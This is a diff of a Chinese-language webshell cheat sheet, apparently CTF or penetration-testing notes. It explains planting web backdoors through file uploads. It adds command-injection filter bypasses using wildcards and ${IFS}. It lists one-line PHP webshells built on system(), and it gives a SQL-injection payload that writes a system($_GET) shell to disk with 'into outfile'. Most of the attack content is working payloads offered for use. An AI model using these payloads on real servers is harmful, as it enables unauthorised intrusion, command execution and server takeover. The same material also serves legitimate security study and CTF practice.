@@ -1,4 +1,4 @@
-## Webshell
+# Webshell
 一種以網頁形式存在的命令執行環境，也稱作**網頁後門**。  
 黑客可以通過瀏覽自己放的後門，得到一個shell以操控伺服器。  
 1. 大馬  
@@ -7,17 +7,35 @@
 程式小巧   
 3. 一句話木馬  
 一段小代碼，可做插入，變化多樣。  
+*  [How works](#how-works)  
+*  [Command injection](#command-injection)  
+*  [Webshell cheatsheet](#webshell-cheatsheet)  
+*  [SQL inj to webshell](#sql-inj-to-webshell)  
+*  [Reference](#reference)
 
-### How works
+# How works
 我們可以通過網站自帶的文件上傳功能將webshell送上去，而文件裡的代碼由server解析進一步執行!  
 1. 尋找上傳點   
 * echo 一個shell到文件中執行  
 * 下載 shell  
 2. 繞過上傳限制 進行上傳  
 * 直接上傳  
-* 繞過 
+* 繞過  
+
+# Command injection
+```php
+// match one character
+cat fla?
+cat ./???sword
+
+// match multiple character
+cat f*
+
+// bypass space 
+cat${IFS}flag
+```
    
-### Webshell cheatsheet
+# Webshell cheatsheet
 ```php
 <?php system('ls'); ?>
 <?php system(ls); ?>
@@ -52,7 +70,7 @@ param=usort(...$_GET);
 [system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
 **基本上除了system都不會直接show在頁面上，exec()和shell_exec()我們都會搭個echo**
 
-### SQL inj to webshell
+# SQL inj to webshell
 MYSQL:  
 ```
 select into outfile(dumpfile)  // mysql write to document
@@ -62,7 +80,7 @@ E.G.
 union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
 ```
 
-### Ref  
+### Reference  
 * [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
 * [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)  
 * [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
